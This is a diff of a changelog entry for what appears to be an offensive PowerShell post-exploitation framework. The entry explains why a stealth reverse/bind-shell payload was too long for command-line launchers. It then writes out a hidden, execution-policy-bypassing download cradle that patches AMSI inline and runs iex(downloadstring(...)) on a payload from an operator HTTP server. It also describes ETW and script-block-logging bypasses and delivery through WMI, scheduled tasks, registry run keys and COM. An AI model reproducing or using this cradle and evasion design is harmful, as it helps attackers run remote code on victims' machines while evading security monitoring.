@@ -5,28 +5,31 @@ Format: `[LAYER] Change description — *why this matters operationally*`
 
 ---
 
-## [2026-06-06r] fix(ux): remove unusable Full command option from stealth payload output
+## [2026-06-06r] fix(ux): replace broken stealth Full command with serve-based download cradle
 
-**Problem:** After selecting stealth format, a sub-prompt offered two options:
-`[1] Inline PS` (paste into existing session) and `[2] Full command` (wrapped in a
-launcher: `powershell.exe -nop -enc <b64>`, wmic, schtask, or com). Option 2 always
-failed — the stealth payload embeds AMSI+ETW+SBL bypass code plus a gzip+obfuscated pipe
-script, making the total length several KB. Base64-encoding it for `powershell.exe -enc`
-routinely exceeds cmd.exe's ~8KB command-line limit, silently truncating the payload on
-delivery. WMI and schtask wrappers hit the same wall.
+**Problem:** After selecting stealth format, option `[2] Full command` wrapped the entire
+stealth payload in `powershell.exe -nop -enc <b64>`. The stealth payload embeds
+AMSI+ETW+SBL bypass code plus gzip+obfuscated pipe script — several KB. Base64-encoding
+it for `-enc` routinely exceeds cmd.exe's ~8KB command-line limit, silently truncating the
+payload and producing a session that immediately dies. WMI, schtask, and COM wrappers hit
+the same limit. `b64`/`gzip` formats are not a substitute — they have no evasion and will
+be caught by AMSI on any monitored target.
 
-**Fix:** Removed the `Get-PayloadLauncher` call and the `[1]/[2]` sub-prompt from both the
-reverse shell and bind shell stealth branches. The inline PS payload is now auto-copied to
-clipboard immediately with a note: `[*] Stealth payload copied to clipboard (inline PS only
--- too large for command-line launchers; use b64/gzip for standalone delivery)`.
-
-The SharpRDP cradle setup (pipe file write to disk, `$global:LastSharpRDPCradleFile`,
-`$global:LastSharpRDPB64`) is preserved — SharpRDP uses a download cradle (~120 chars),
-not the full payload as a command-line argument.
-
-**Guidance:** Stealth is for paste-into-existing-PS-session delivery (no command-line length
-limit). For standalone launcher delivery (WMI, schtasks, registry run key), use `b64` or
-`gzip` — both already output a launcher-ready command directly without a sub-prompt.
+**Fix:** Option `[2]` is now a **serve-based download cradle**:
+```
+powershell -nop -ep bypass -w hidden -c "<amsi_patch>;iex(downloadstring('http://IP:8080/pipe_NAME.ps1'))"
+```
+- ~200 chars — fits any command-line launcher (WMI, schtasks, registry run key, COM, etc.)
+- AMSI patched inline in the cradle before `iex`, so the downloaded stealth payload
+  executes past AMSI; the stealth PS itself then applies ETW+SBL bypasses for the session
+- Requires `serve` to be running; operator HTTP server hosts the stealth inline PS file
+- Pipe file is written to `$global:AmnesiacRoot` at payload-generation time (both reverse
+  and bind shell paths); SharpRDP cradle globals updated in bind shell path as before
+- Serve-running check (TCP probe 127.0.0.1:8080) shown before the prompt; red warning
+  printed if serve is not running
+- `Amnesiac_ShellReady.ps1`: pipe file write gated on `$global:DiskMode` — if diskmode
+  is OFF, file is not written and a warning is shown (clipboard still populated with cradle
+  command; operator must write the file manually or enable diskmode)
 
 ---
 
